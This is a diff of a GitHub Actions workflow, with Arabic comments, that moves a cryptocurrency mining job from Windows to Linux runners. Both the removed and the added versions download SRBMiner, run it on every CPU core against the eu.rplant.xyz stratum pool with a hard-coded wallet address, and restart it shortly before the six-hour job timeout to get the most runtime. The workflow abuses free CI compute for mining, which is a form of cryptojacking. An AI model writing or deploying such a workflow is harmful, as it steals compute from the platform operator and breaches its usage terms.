@@ -1,78 +1,57 @@
-name: Windows-Miner-Max
+name: Linux-Miner-Max
 
 on:
   workflow_dispatch:
 
 jobs:
   miner:
-    runs-on: windows-latest
+    runs-on: ubuntu-latest
     timeout-minutes: 360  # 6 ساعات
 
     steps:
-      - name: Download SRBMiner 3.0.3
-        shell: pwsh
+      - name: Install dependencies
         run: |
-          Invoke-WebRequest -Uri "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.0.3/SRBMiner-Multi-3-0-3-win64.zip" -OutFile "miner.zip"
-          Expand-Archive miner.zip -DestinationPath "miner"
+          sudo apt update
+          sudo apt install -y wget unzip
+
+      - name: Download SRBMiner 3.0.3 (Linux)
+        run: |
+          wget -O miner.zip "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.0.3/SRBMiner-Multi-3-0-3-linux64.zip"
+          unzip miner.zip -d miner
 
       - name: Start SRBMiner (yespoweradvc) Max CPU
-        shell: pwsh
         run: |
-          function Start-Miner {
-            cd miner
-            $folder = Get-ChildItem -Directory | Where-Object { $_.Name -like "SRBMiner*" } | Select-Object -First 1
-            $exe = Join-Path $folder.FullName "SRBMiner-MULTI.exe"
-            if (-not (Test-Path $exe)) { Write-Error "❌ SRBMiner-MULTI.exe غير موجود!"; exit 1 }
-
-            # استخدام جميع الأنوية المتاحة
-            $cpuThreads = [Environment]::ProcessorCount
-            Write-Host "➡ تشغيل SRBMiner بأقصى عدد من الأنوية: $cpuThreads"
-
-            Start-Process $exe -ArgumentList @(
-              "-a", "yespoweradvc",
-              "-o", "stratum+tcps://eu.rplant.xyz:17149",
-              "-u", "Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E",
-              "-p", "x",
-              "--cpu-threads", "$cpuThreads"
-            )
-          }
-
-          # تشغيل miner أول مرة
-          Start-Miner
+          cd miner
+          folder=$(ls -d SRBMiner* | head -n 1)
+          exe="$folder/SRBMiner-MULTI"
+          chmod +x "$exe"
+          threads=$(nproc)
+          echo "➡ تشغيل SRBMiner بأقصى عدد من الأنوية: $threads"
+          nohup "$exe" -a yespoweradvc -o stratum+tcps://eu.rplant.xyz:17149 -u Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E -p x --cpu-threads $threads > miner.log 2>&1 &
 
       - name: Full Restart Before Timeout
-        shell: pwsh
         run: |
           # الانتظار 5 ساعات و40 دقيقة = 340 دقيقة
-          $waitMinutes = 340
-          Write-Host "⏱ الانتظار $waitMinutes دقيقة قبل إعادة تشغيل كامل للminer"
-          Start-Sleep -Seconds ($waitMinutes * 60)
+          wait_minutes=340
+          echo "⏱ الانتظار $wait_minutes دقيقة قبل إعادة تشغيل كامل للminer"
+          sleep $((wait_minutes * 60))
 
-          # إيقاف أي miner يعمل
-          $procs = Get-Process -Name "SRBMiner-MULTI" -ErrorAction SilentlyContinue
-          if ($procs) {
-            Write-Host "⛔ إيقاف العمليات الحالية للminer..."
-            $procs | ForEach-Object { $_.Kill() }
-            Start-Sleep -Seconds 5
-          }
+          # قتل أي عمليات SRBMiner تعمل
+          echo "⛔ إيقاف العمليات الحالية للminer..."
+          pkill -f SRBMiner-MULTI || true
+          sleep 5
 
           # إعادة تشغيل miner كامل بأقصى قدرة
-          Write-Host "🔄 إعادة تشغيل SRBMiner بالكامل بأقصى قدراته"
           cd miner
-          $folder = Get-ChildItem -Directory | Where-Object { $_.Name -like "SRBMiner*" } | Select-Object -First 1
-          $exe = Join-Path $folder.FullName "SRBMiner-MULTI.exe"
-          $cpuThreads = [Environment]::ProcessorCount
-          Start-Process $exe -ArgumentList @(
-            "-a", "yespoweradvc",
-            "-o", "stratum+tcps://eu.rplant.xyz:17149",
-            "-u", "Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E",
-            "-p", "x",
-            "--cpu-threads", "$cpuThreads"
-          )
+          folder=$(ls -d SRBMiner* | head -n 1)
+          exe="$folder/SRBMiner-MULTI"
+          chmod +x "$exe"
+          threads=$(nproc)
+          echo "🔄 إعادة تشغيل SRBMiner بالكامل بأقصى قدراته"
+          nohup "$exe" -a yespoweradvc -o stratum+tcps://eu.rplant.xyz:17149 -u Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E -p x --cpu-threads $threads > miner.log 2>&1 &
 
           # انتظار حتى نهاية workflow (~20 دقيقة)
-          $remainingMinutes = 20
-          Write-Host "⏱ انتظار $remainingMinutes دقيقة إضافية حتى نهاية workflow"
-          Start-Sleep -Seconds ($remainingMinutes * 60)
-
-          Write-Host "✅ انتهت مدة workflow"
+          remaining_minutes=20
+          echo "⏱ انتظار $remaining_minutes دقيقة إضافية حتى نهاية workflow"
+          sleep $((remaining_minutes * 60))
+          echo "✅ انتهت مدة workflow"
